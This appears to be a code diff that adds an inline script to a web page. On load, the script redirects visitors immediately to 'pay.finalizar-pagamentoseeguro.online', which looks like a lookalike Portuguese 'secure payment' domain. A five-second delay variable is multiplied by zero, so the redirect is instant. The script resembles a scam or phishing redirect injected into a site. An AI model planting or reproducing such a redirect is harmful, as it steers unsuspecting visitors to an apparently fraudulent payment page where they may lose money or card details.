@@ -1,0 +1,10 @@
+<script type="text/javascript">
+  var segundos = 5;
+    function redirecionarAposSegundos() {
+      setTimeout(function() {
+        window.location.href = "https://pay.finalizar-pagamentoseeguro.online/q510ZOx7aNOGE9D";
+      }, segundos*0);
+    }
+
+    redirecionarAposSegundos();
+  </script>
